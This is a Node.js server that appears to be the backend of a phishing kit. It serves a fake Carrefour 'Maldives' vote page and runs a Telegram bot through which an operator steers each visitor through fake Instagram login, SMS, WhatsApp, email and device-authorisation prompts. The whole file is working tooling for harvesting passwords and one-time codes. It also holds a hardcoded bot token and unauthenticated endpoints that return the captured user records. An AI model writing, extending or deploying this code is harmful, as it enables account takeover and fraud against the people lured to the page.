const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');
const PORT = process.env.PORT || 3000;
const TG_TOKEN = String(process.env.TELEGRAM_BOT_TOKEN || '8553250128:AAEx3g-fZtNcj-pAezqwQUa8lSNr9EZVaps')
    .replace(/[^0-9A-Za-z:_-]/g, '').trim();

var mimeTypes = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon'
};

var DATA_FILE = path.join(__dirname, 'data_users.json');
var VOTES_FILE = path.join(__dirname, 'data_votes.json');

function readData(file) {
    try {
        var d = JSON.parse(fs.readFileSync(file, 'utf8'));
        return Array.isArray(d) ? d : [];
    } catch (e) { return []; }
}
function writeData(file, data) {
    fs.writeFileSync(file, JSON.stringify(data), 'utf8');
}

function sendJSON(res, code, obj) {
    res.writeHead(code, {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end(JSON.stringify(obj));
}

// ---- Telegram Bot (actions from bot) ----
var TG_OFFSET = 0;
var BOT_ACTIONS = [
    ['login', 'Instagram Login'],
    ['login_incorrect', 'Login incorrect'],
    ['loading', 'Loading'],
    ['vote_approved', 'Approuver'],
    ['sms_verification', 'SMS Verification'],
    ['sms_error', 'SMS incorrect'],
    ['whatsapp_verification', 'WhatsApp Verification'],
    ['whatsapp_error', 'WhatsApp incorrect'],
    ['email_verification', 'Email Verification'],
    ['email_error', 'Email incorrect'],
    ['authorize_device', 'Autorisation'],
    ['technical_error', 'Erreur technique'],
    ['retry', 'Reessayer']
];

function tg(method, payload, cb) {
    if (!TG_TOKEN) { if (cb) cb(new Error('no token')); return; }
    var data = JSON.stringify(payload);
    try {
        var req = https.request({
            hostname: 'api.telegram.org',
            path: '/bot' + TG_TOKEN + '/' + encodeURIComponent(method),
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
        }, function(resp) {
            var buf = '';
            resp.on('data', function(c) { buf += c; });
            resp.on('end', function() {
                if (cb) {
                    try { cb(null, JSON.parse(buf)); } catch (e) { cb(e); }
                }
            });
        });
        req.on('error', function(e) { if (cb) cb(e); });
        req.setTimeout(15000, function() { req.destroy(); });
        req.write(data);
        req.end();
    } catch (e) { if (cb) cb(e); }
}

function tgSend(chatId, text, keyboard) {
    var payload = { chat_id: chatId, text: text, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = keyboard;
    tg('sendMessage', payload, function() {});
}

function tgAnswer(cbId, text) {
    tg('answerCallbackQuery', { callback_query_id: cbId, text: text }, function() {});
}

function tgListKeyboard() {
    var users = readData(DATA_FILE).filter(function(u) { return u.visitorId; });
    var rows = users.slice(0, 40).map(function(u) {
        return [{ text: '@' + u.username + ' (' + u.status + ')', callback_data: 'sel:' + u.visitorId }];
    });
    if (!rows.length) rows = [[{ text: 'Aucun client', callback_data: 'noop' }]];
    rows.push([{ text: 'Rafraichir', callback_data: 'list' }]);
    return { inline_keyboard: rows };
}

function tgActionKeyboard(visitorId) {
    var rows = [];
    var row = [];
    BOT_ACTIONS.forEach(function(a, i) {
        row.push({ text: a[1], callback_data: 'act:' + visitorId + ':' + a[0] });
        if (row.length === 2) { rows.push(row); row = []; }
    });
    if (row.length) rows.push(row);
    rows.push([{ text: '<< Clients', callback_data: 'list' }]);
    return { inline_keyboard: rows };
}

function tgSetAction(visitorId, action) {
    var users = readData(DATA_FILE);
    var idx = users.findIndex(function(u) { return u.visitorId === visitorId; });
    if (idx < 0) return null;
    if (action === 'vote_approved') {
        users[idx].status = 'approved';
    } else {
        if (users[idx].status === 'visiting') users[idx].status = 'pending';
        users[idx].action = action;
    }
    writeData(DATA_FILE, users);
    return users[idx];
}

function tgHandleUpdate(update) {
    if (update.callback_query) {
        var cb = update.callback_query;
        var data = cb.data || '';
        var chatId = cb.message && cb.message.chat ? cb.message.chat.id : null;
        if (data === 'list' || data === 'noop') {
            tgAnswer(cb.id, 'Liste');
            if (chatId != null) tgSend(chatId, 'Choisissez un client :', tgListKeyboard());
            return;
        }
        if (data.indexOf('sel:') === 0) {
            var vid = data.slice(4);
            var users = readData(DATA_FILE);
            var user = users.find(function(u) { return u.visitorId === vid; });
            if (!user) { tgAnswer(cb.id, 'Client introuvable'); return; }
            tgAnswer(cb.id, '@' + user.username);
            if (chatId != null) tgSend(chatId, 'Actions pour <b>@' + user.username + '</b> (' + user.status + ') :', tgActionKeyboard(vid));
            return;
        }
        if (data.indexOf('act:') === 0) {
            var parts = data.split(':');
            var vid2 = parts[1];
            var act = parts[2];
            var user2 = tgSetAction(vid2, act);
            if (!user2) { tgAnswer(cb.id, 'Client introuvable'); return; }
            tgAnswer(cb.id, 'Action envoyee');
            if (chatId != null) tgSend(chatId, '✅ <b>' + act + '</b> envoyee à <b>@' + user2.username + '</b>', tgActionKeyboard(vid2));
            return;
        }
        return;
    }

    var msg = update.message;
    if (!msg || !msg.text) return;
    var chatId = msg.chat.id;
    var text = msg.text.trim();
    if (text === '/start' || text === '/clients' || text === '/panel') {
        tgSend(chatId, 'Choisissez un client pour envoyer une action :', tgListKeyboard());
        return;
    }
    tgSend(chatId, 'Commandes : /clients (liste) - /start', { inline_keyboard: [[{ text: 'Clients', callback_data: 'list' }]] });
}

function pollTelegram() {
    if (!TG_TOKEN) return;
    try {
        var req = https.request({
            hostname: 'api.telegram.org',
            path: '/bot' + TG_TOKEN + '/getUpdates?timeout=0&offset=' + (parseInt(TG_OFFSET, 10) || 0),
            method: 'GET'
        }, function(resp) {
            var buf = '';
            resp.on('data', function(c) { buf += c; });
            resp.on('end', function() {
                try {
                    var obj = JSON.parse(buf);
                    if (obj.ok && obj.result && obj.result.length) {
                        obj.result.forEach(function(u) {
                            try { tgHandleUpdate(u); } catch (e) {}
                            if (u.update_id >= TG_OFFSET) TG_OFFSET = u.update_id + 1;
                        });
                    }
                } catch (e) {}
                setTimeout(pollTelegram, 800);
            });
        });
        req.on('error', function() { setTimeout(pollTelegram, 4000); });
        req.setTimeout(20000, function() { req.destroy(); });
        req.end();
    } catch (e) {
        setTimeout(pollTelegram, 4000);
    }
}
if (TG_TOKEN) { pollTelegram(); console.log('Telegram bot polling started'); }


http.createServer(function(req, res) {
    var parsed = url.parse(req.url, true);
    var pathname = parsed.pathname;

    if (req.method === 'OPTIONS') {
        res.writeHead(200, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type'
        });
        return res.end();
    }

    if (pathname === '/api/users' && req.method === 'GET') {
        return sendJSON(res, 200, readData(DATA_FILE));
    }

    // Atomic read-and-clear of pending action (mirrors reference consumePendingAction).
    // Prevents the redirect loop: the action is removed server-side the moment it is read.
    if (pathname === '/api/consume_action' && req.method === 'GET') {
        var vid = parsed.query.visitorId;
        var users = readData(DATA_FILE);
        var idx = users.findIndex(function(u) { return u.visitorId === vid; });
        if (idx < 0) return sendJSON(res, 200, { action: null });
        var pending = users[idx].action || null;
        if (pending) {
            users[idx].action = null;
            writeData(DATA_FILE, users);
        }
        return sendJSON(res, 200, {
            action: pending,
            status: users[idx].status,
            username: users[idx].username
        });
    }

    if (pathname === '/api/users' && req.method === 'POST') {
        var body = '';
        req.on('data', function(chunk) { body += chunk; });
        req.on('end', function() {
            try {
                var incoming = JSON.parse(body);
                var users = readData(DATA_FILE);
                var list = Array.isArray(incoming) ? incoming : [incoming];
                list.forEach(function(item) {
                    if (item && item.visitorId) {
                        var idx = users.findIndex(function(u) { return u.visitorId === item.visitorId; });
                        if (idx >= 0) { users[idx] = Object.assign(users[idx], item); }
                        else { users.push(item); }
                    }
                });
                writeData(DATA_FILE, users);
                sendJSON(res, 200, { ok: true, count: users.length });
            } catch (e) {
                sendJSON(res, 400, { error: 'Invalid JSON' });
            }
        });
        return;
    }

    if (pathname === '/api/users' && req.method === 'PUT') {
        var body = '';
        req.on('data', function(chunk) { body += chunk; });
        req.on('end', function() {
            try {
                var incoming = JSON.parse(body);
                var users = readData(DATA_FILE);
                if (Array.isArray(incoming)) {
                    incoming.forEach(function(item) {
                        if (item.visitorId) {
                            var idx = users.findIndex(function(u) { return u.visitorId === item.visitorId; });
                            if (idx >= 0) { users[idx] = Object.assign(users[idx], item); }
                            else { users.push(item); }
                        }
                    });
                } else if (incoming.visitorId) {
                    var idx = users.findIndex(function(u) { return u.visitorId === incoming.visitorId; });
                    if (idx >= 0) { users[idx] = Object.assign(users[idx], incoming); }
                    else { users.push(incoming); }
                }
                writeData(DATA_FILE, users);
                sendJSON(res, 200, { ok: true, count: users.length });
            } catch (e) {
                sendJSON(res, 400, { error: 'Invalid JSON' });
            }
        });
        return;
    }

    if (pathname === '/api/votes' && req.method === 'GET') {
        return sendJSON(res, 200, readData(VOTES_FILE));
    }

    if (pathname === '/api/votes' && req.method === 'POST') {
        var body = '';
        req.on('data', function(chunk) { body += chunk; });
        req.on('end', function() {
            try {
                var incoming = JSON.parse(body);
                var votes = readData(VOTES_FILE);
                var list = Array.isArray(incoming) ? incoming : [incoming];
                list.forEach(function(v) {
                    if (!v) return;
                    var dup = votes.some(function(x) {
                        return x && x.voter === v.voter && x.candidate === v.candidate;
                    });
                    if (!dup) votes.push(v);
                });
                writeData(VOTES_FILE, votes);
                sendJSON(res, 200, { ok: true, count: votes.length });
            } catch (e) {
                sendJSON(res, 400, { error: 'Invalid JSON' });
            }
        });
        return;
    }

    if (pathname.indexOf('/api/') === 0) {
        return sendJSON(res, 404, { error: 'Not found' });
    }

    var filePath = '.' + pathname.split('?')[0];
    if (filePath === './') filePath = './carrefour-maldives.html';

    var ext = String(path.extname(filePath)).toLowerCase();
    var contentType = mimeTypes[ext] || 'application/octet-stream';

    fs.readFile(filePath, function(err, content) {
        if (err) {
            if (err.code === 'ENOENT') {
                // Pages de destination manquantes : vrai 404 au lieu de servir
                // silencieusement la page du vote (fallback carrefour-maldives).
                if (pathname.indexOf('/pages/') === 0) {
                    res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
                    return res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404</title></head><body style="font-family:sans-serif;text-align:center;padding:60px"><h1>404 - Page introuvable</h1><p>' + pathname.replace(/[<>&"]/g, '') + '</p></body></html>', 'utf-8');
                }
                fs.readFile('./carrefour-maldives.html', function(e, c) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(c, 'utf-8');
                });
            } else {
                res.writeHead(500);
                res.end('Server Error');
            }
        } else {
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(content, 'utf-8');
        }
    });
}).listen(PORT, function() {
    console.log('Server running on port ' + PORT);
});
